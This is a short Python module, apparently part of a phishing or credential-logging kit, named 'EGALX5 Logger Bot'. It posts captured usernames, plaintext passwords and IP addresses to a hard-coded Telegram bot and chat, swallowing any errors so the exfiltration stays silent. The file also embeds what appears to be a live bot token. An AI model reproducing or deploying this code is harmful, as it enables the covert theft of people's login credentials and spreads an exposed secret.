# telegram_alert.py

import requests

# Config
BOT_TOKEN = "7657625845:AAEL7RP1LWF2tUCWHfK71ocfWqGsG4VusDY"
CHAT_ID = "6923749969"  # Your Telegram User ID

def send_telegram_alert(username, password, ip_address, status):
    message = f"""
📌 New Login Details:

👤 Username: {username}
🔐 Password: {password}
🌐 IP Address: {ip_address}
📊 Status: {status}

- EGALX5 Logger Bot
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }

    try:
        requests.post(url, data=payload)
    except:
        pass  # No output, even if sending fails
